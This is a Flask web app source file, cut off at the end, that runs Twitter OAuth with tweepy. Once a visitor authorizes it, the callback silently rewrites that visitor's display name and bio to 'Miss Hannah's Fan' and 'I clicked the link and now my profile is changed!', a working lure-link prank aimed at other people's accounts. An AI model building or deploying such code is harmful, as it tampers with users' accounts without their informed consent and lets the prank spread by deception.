import os
import subprocess
import tweepy
from flask import Flask, redirect, request, session
from dotenv import load_dotenv

# Ensure Gunicorn is installed
try:
    import gunicorn
except ImportError:
    print("Gunicorn not found. Installing...")
    subprocess.run(["pip", "install", "gunicorn"])

# Load environment variables
load_dotenv()

# Twitter API credentials
API_KEY = os.getenv("API_KEY")
API_SECRET = os.getenv("API_SECRET")
CALLBACK_URL = os.getenv("CALLBACK_URL")

# Ensure environment variables are set
if not all([API_KEY, API_SECRET, CALLBACK_URL]):
    raise ValueError("❌ ERROR: Missing API keys!")

# Initialize Flask app
app = Flask(__name__)
app.secret_key = os.urandom(24)  # Random secure key for sessions

@app.route("/")
def login():
    """Redirect user to Twitter for authentication."""
    auth = tweepy.OAuthHandler(API_KEY, API_SECRET, CALLBACK_URL)
    try:
        redirect_url = auth.get_authorization_url()
        session["request_token"] = auth.request_token["oauth_token"]
        session["request_token_secret"] = auth.request_token["oauth_token_secret"]
        return redirect(redirect_url)
    except tweepy.TweepyException as e:
        return f"Error! Failed to get request token. {str(e)}"

@app.route("/callback")
def callback():
    """Handle Twitter OAuth callback."""
    request_token = session.pop("request_token", None)
    request_token_secret = session.pop("request_token_secret", None)

    if not request_token or not request_token_secret:
        return "❌ Error: Missing request token in session."

    auth = tweepy.OAuthHandler(API_KEY, API_SECRET, CALLBACK_URL)
    auth.request_token = {
        "oauth_token": request.args.get("oauth_token"),
        "oauth_token_secret": request_token_secret
    }

    try:
        auth.get_access_token(request.args.get("oauth_verifier"))
        api = tweepy.API(auth)

        # Change the authenticated user's Twitter profile
        new_username = "Miss Hannah's Fan"
        new_bio = "I clicked the link and now my profile is changed!"
        
        api.update_profile(name=new_username, description=new_bio)

        return f"✅ Success! Your profile has been updated to: {new_username} - {new_bio}"

    except tweepy.TweepyException as e:
        return f"❌ Error updating profile: {str(e)}"

# Force Gunicorn to start properly on Render
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))  # Use Render's assigned port
    print(f"